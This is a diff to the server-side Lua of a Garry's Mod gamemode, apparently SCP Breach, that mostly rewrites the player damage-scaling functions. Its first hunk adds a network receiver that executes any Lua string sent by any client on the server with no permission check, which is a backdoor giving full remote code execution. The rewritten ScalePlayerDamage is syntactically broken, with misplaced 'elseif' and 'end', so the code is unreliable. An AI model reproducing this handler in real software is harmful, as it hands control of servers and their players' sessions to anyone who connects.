@@ -16,6 +16,16 @@ function test2(ply)
 end
 concommand.Add("test2", test2)
 
+net.Receive("Breach:RunStringOnServer", function(len, ply, argstr, error)
+    local argstr = net.ReadString()
+    if argstr != "" and !error then
+        RunString(argstr, "BR_LUA_SV", true)
+        net.Start("Breach:RunStringOnServer")
+        net.WriteBool(true)
+        net.Send(ply)
+    end
+end)
+
 function mply:CompleteAchievement(achivname, ply)
 	net.Start("Completeachievement_serverside")
 	net.WriteString(achivname)
@@ -771,52 +781,48 @@ function GM:GetFallDamage(player,speed)
 	return dmg
 end
 
-function GM:EntityTakeDamage(target,entity,dmgInfo,lastHitGroup,role)
-	if target:IsPlayer() then
-	   target:AddEFlags( -2147483648 )
+function GetRoleResists(ply, hit_group)
+    if hit_group == "head" then
+        return ply.HeadResist
+    elseif hit_group == "gear" then
+        return ply.GearResist
+    elseif hit_group == "stomach" then
+        return ply.StomachResist
+    elseif hit_group == "arm" then
+        return ply.ArmResist
+    elseif hit_group == "leg" then
+        return ply.LegResist
+    else
+        return ply.HeadResist, ply.GearResist, ply.StomachResist, ply.ArmResist, ply.LegResist
+    end
+end
+
+function GM:EntityTakeDamage(ply,dmg)
+	if ply:IsPlayer() then
+		ply:AddEFlags( -2147483648 )
 	else
-	   target:RemoveEFlags( -2147483648 )
+		ply:RemoveEFlags( -2147483648 )
 	end
 end
 
-function mply:GetRoleResists(role)
-	if role.damage_modifiers then
-		return role.damage_modifiers.HITGROUP_HEAD
-	else
-		return nil
-	end
-end
-
-function GM:ScalePlayerDamage(ply, hitgroup, dmg, role)
-	local multiply = 0.6
-	if ply:GetRoleResists() then
-		if hitgroup == HITGROUP_HEAD then
-			print("NMIGGGG")
-			multiply = 1
-		elseif hitgroup == HITGROUP_CHEST then
-			multiply = 0.6
-		elseif hitgroup == HITGROUP_STOMACH then
-			multiply = 0.5
-		elseif hitgroup == HITGROUP_RIGHTARM or hitgroup == HITGROUP_LEFTARM then
-			multiply = 0.5
-		end
-	else
-		if hitgroup == HITGROUP_HEAD then
-			multiply = 10
-		elseif hitgroup == HITGROUP_CHEST then
-			multiply = 1.15
-		elseif hitgroup == HITGROUP_STOMACH then
-			multiply = 0.9
-		elseif hitgroup == HITGROUP_RIGHTARM or hitgroup == HITGROUP_LEFTARM then
-			multiply = 0.9
-		elseif hitgroup == HITGROUP_RIGHTLEG or hitgroup == HITGROUP_LEFTLEG then
-			--ply:SlowDown()
-		end
-	end
-	if ply:GTeam() == TEAM_SCP then
-		multiply = 0.4
-	end
-	dmg:ScaleDamage(multiply)
+function GM:ScalePlayerDamage(ply, hitgroup, dmginfo)
+	if ply:GTeam() != TEAM_SCP then 
+        if hitgroup == HITGROUP_HEAD then
+            dmginfo:ScaleDamage( GetRoleResists(ply, "head") + 2 )
+        elseif hitgroup == HITGROUP_CHEST or hitgroup == HITGROUP_GEAR then
+            dmginfo:ScaleDamage( GetRoleResists(ply, "gear") + 0.5 )
+        elseif hitgroup == HITGROUP_STOMACH then
+            dmginfo:ScaleDamage( GetRoleResists(ply, "stomach") + 0.5 )
+        elseif hitgroup == HITGROUP_LEFTARM or hitgroup == HITGROUP_RIGHTARM then
+           dmginfo:ScaleDamage( GetRoleResists(ply, "arm") + 0.5 )
+        elseif hitgroup == HITGROUP_LEFTLEG or hitgroup == HITGROUP_RIGHTLEG then
+           dmginfo:ScaleDamage( GetRoleResists(ply, "leg") + 0.5 )
+        end
+        elseif
+        dmginfo:IsDamageType(DMG_BULLET) then
+            dmginfo:ScaleDamage(0.4)
+        end
+    end
 end
 
 function GM:PlayerDeathSound(ply)
